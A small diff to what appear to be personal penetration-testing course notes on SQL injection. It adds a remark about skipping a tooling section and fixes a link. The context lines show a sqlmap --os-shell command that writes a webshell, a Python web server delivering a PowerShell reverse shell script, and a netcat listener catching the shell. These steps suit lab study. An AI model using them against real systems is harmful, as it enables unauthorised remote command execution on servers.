@@ -468,6 +468,8 @@ sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
 
 🔁 **Similar to:** `--os-shell` is doing exactly the same `INTO OUTFILE` + webshell trick from 10.3.1 manually, sqlmap just automates the write, the upload, and the `cmd`-parameter interaction into one flow.
 
+> ⚡ **On [[MODERN TOOLING]] for this module:** deliberately no addition. sqlmap, covered above, already *is* the automation tool this whole category is about, it's not something to "speed up" further, it's core curriculum here. See [[MODERN TOOLING#Modules with no addition, and why|MODERN TOOLING's own note]] on why this module is a deliberate skip.
+
 #### Tags: #Sqlmap #SqlmapDump #SqlmapOsShell #WebRootParam
 
 **Lab status: ✅ Completed:**
@@ -896,7 +898,7 @@ EOF
 python3 -m http.server 80
 nc -lnvp 4444   # in a second terminal
 ```
-> **🛠️ Troubleshooting hit: first request 404'd.** `python3 -m http.server` was started from a different directory than where `shell.ps1` actually lived, same gotcha already flagged in [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]] and [[COMMAND APPENDIX/Web Requests & Delivery|Command Appendix]]: it serves whatever directory it's launched from, `cd` into the right one *immediately* before starting it.
+> **🛠️ Troubleshooting hit: first request 404'd.** `python3 -m http.server` was started from a different directory than where `shell.ps1` actually lived, same gotcha already flagged in [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]] and [[Web Requests & Delivery|Command Appendix]]: it serves whatever directory it's launched from, `cd` into the right one *immediately* before starting it.
 
 Fire the stacked injection:
 ```bash
